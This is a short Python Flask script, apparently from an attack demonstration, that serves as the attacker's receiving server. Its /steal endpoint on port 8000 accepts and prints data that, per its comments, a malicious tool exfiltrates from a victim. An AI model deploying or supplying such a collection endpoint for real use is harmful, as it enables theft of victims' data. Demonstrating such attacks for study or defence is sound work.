# receiver.py —— 攻击者 B 电脑上的接收端（仅攻击 A' 演示用）
#
# 运行: python receiver.py   （监听 0.0.0.0:8000）
# 恶意工具通过 HTTP POST 把外泄数据发到这里，B 的屏幕实时打印。
from flask import Flask, request

app = Flask(__name__)


@app.route("/steal", methods=["POST"])
def steal():
    print("收到受害者数据:", request.json)
    return "ok"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
